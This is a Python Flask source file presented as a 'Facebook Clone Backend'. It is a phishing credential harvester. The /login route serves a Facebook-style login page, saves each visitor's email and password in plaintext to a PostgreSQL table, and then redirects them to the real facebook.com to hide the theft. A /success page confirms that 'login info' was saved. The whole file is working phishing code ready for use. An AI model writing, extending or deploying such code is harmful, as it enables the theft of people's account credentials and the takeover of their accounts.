from flask import Flask, render_template, request, redirect
import psycopg2
import os

app = Flask(__name__)

@app.route('/')
def home():
    return "Facebook Clone Backend is Live!"
def get_db_connection():
    return psycopg2.connect(
        dbname=os.environ.get("DB_NAME"),
        user=os.environ.get("DB_USER"),
        password=os.environ.get("DB_PASSWORD"),
        host=os.environ.get("DB_HOST"),
        port=os.environ.get("DB_PORT", 5432)
    )

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO users (email, password) VALUES (%s, %s)",
                (email, password)
            )
            conn.commit()
            cursor.close()
            conn.close()
            return redirect("https://www.facebook.com")
        except Exception as e:
            print(f"Database error: {e}")
            return "Failed to save login info."

    return render_template('fblogin.html')

@app.route('/success')
def login_success():
    return "<h2>Login info saved successfully!</h2>"

if __name__ == '__main__':
    app.run(debug=True)
